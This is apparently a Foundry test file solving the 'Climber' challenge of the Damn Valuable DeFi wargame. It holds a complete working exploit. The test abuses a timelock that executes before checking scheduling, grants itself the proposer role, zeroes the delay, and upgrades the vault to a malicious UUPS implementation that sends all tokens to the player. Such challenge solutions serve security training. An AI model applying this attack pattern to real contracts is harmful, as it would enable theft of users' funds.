// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {ClimberLevel} from "../../src/climber/ClimberLevel.sol";
import {ClimberTimelock} from "../../src/climber/ClimberTimelock.sol";
import {DamnValuableToken} from "dvt/DamnValuableToken.sol";
import {PROPOSER_ROLE} from "../../src/climber/ClimberConstants.sol";

import "forge-std/Test.sol";

contract AttackerSchedule {
  address timelockAddress;
  bytes payload;

  constructor(address _timelockAddress) {
    timelockAddress = _timelockAddress;
  }

  function setSchedule() external {
    (bool success,) = timelockAddress.call(payload);
      success;
  }

  function setPayload(bytes memory _payload) external {
    payload = _payload;
  }
}

contract AttackerVault is UUPSUpgradeable {
  function initialize(address tokenAddress, address playerAddress) public {
    DamnValuableToken token = DamnValuableToken(tokenAddress);
    uint256 balance = token.balanceOf(address(this));

    DamnValuableToken(tokenAddress).transfer(playerAddress, balance);
  }

  // Function required by the interface.
  function _authorizeUpgrade(address newImplementation) internal override {}
}

contract ClimberTest is Test {
  ClimberLevel level = new ClimberLevel();

  function setUp() public {
    level.setup();
  }

  function test() public {
    ClimberTimelock timelock = level.timelock();
    AttackerSchedule attackerSchedule = new AttackerSchedule(address(timelock));
    AttackerVault attackerVault = new AttackerVault();

    address[] memory targets = new address[](4);
    uint256[] memory values = new uint256[](4);
    bytes[] memory dataElements = new bytes[](4);
    bytes32 salt = keccak256(abi.encodePacked("salt"));

    targets[0] = address(timelock);
    values[0] = 0;
    dataElements[0] = abi.encodeWithSignature(
      "grantRole(bytes32,address)",
      PROPOSER_ROLE,
      address(attackerSchedule)
    );

    targets[1] = address(level.vault());
    values[1] = 0;
    dataElements[1] = abi.encodeWithSignature(
      "upgradeToAndCall(address,bytes)",
      address(attackerVault),
      abi.encodeWithSignature(
        "initialize(address,address)",
        address(level.token()),
        level.playerAddress()
      )
    );

    targets[2] = address(timelock);
    values[2] = 0;
    dataElements[2] = abi.encodeWithSignature(
      "updateDelay(uint64)",
      0
    );

    targets[3] = address(attackerSchedule);
    values[3] = 0;
    dataElements[3] = abi.encodeWithSignature(
      "setSchedule()"
    );

    bytes memory payload = abi.encodeWithSignature(
      "schedule(address[],uint256[],bytes[],bytes32)",
      targets,
      values,
      dataElements,
      salt
    );
    attackerSchedule.setPayload(payload);

    timelock.execute(targets, values, dataElements, salt);

    level.validate();
  }
}
